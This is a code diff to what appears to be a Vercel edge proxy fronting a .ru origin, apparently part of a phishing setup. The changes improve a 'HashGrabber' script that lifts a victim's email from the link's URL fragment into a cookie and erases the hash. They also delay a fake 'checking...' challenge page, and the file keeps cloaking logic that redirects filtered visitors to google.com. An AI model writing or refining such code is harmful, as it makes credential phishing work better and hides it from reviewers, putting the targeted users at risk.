@@ -6,7 +6,7 @@ export const config = {
 // ---- config: edit these (or set them in Vercel Environment Variables) ----
 const ORIGIN = process.env.ORIGIN || 'https://europolus.ru';
 const PREFIX = process.env.PREFIX || '/ar';
-const BLOCK_REDIRECT = process.env.BLOCK_REDIRECT || 'https://www.ufc/';
+const BLOCK_REDIRECT = process.env.BLOCK_REDIRECT || 'https://www.google.com/';
 const MY_IP = process.env.MY_IP || '';              
 const SECRET = process.env.SECRET || 'k9x2mQ7vLp4Rt8Zb';  
 
@@ -21,10 +21,15 @@ const HASH_GRABBER = `<script>
         const hash = window.location.hash.substring(1);
         console.log("[HashGrabber] Detected URL hash:", hash);
         
+        // FIX 1: Use regex to prevent false positives from similar cookie names
         if (hash && !/(^|;\\s*)autograb_email=/.test(document.cookie)) {
             document.cookie = "autograb_email=" + encodeURIComponent(hash) + "; path=/; max-age=86400; SameSite=Lax";
             console.log("[HashGrabber] Cookie 'autograb_email' set successfully!");
+            
+            // FIX 2: Clear the hash from the URL immediately so downstream 
+            // redirects/middlemen don't see it and duplicate it.
             window.history.replaceState(null, document.title, window.location.pathname + window.location.search);
+            
         } else if (!hash) {
             console.log("[HashGrabber] No hash found in the URL.");
         }
@@ -120,7 +125,10 @@ async function challenge(request, ip, err) {
     f.searchParams.set('c', '2');
     const sec = Math.floor(Date.now() / 1000);
     const sig = await hmac(ip + '|' + sec);
-    const html = '<!doctype html><meta charset=utf-8>' + HASH_GRABBER + '<body style="font:14px monospace;padding:40px">checking...<script>location.replace(' + JSON.stringify(f.pathname + f.search) + ' + window.location.hash)</script>';
+    
+    // FIX 3: Added setTimeout delay to ensure cookie is saved before redirect
+    const html = '<!doctype html><meta charset=utf-8>' + HASH_GRABBER + '<body style="font:14px monospace;padding:40px">checking...<script>setTimeout(function(){location.replace(' + JSON.stringify(f.pathname + f.search) + ' + window.location.hash)},100)</script>';
+    
     return new Response(html, {
       headers: {
         'Content-Type': 'text/html; charset=utf-8',
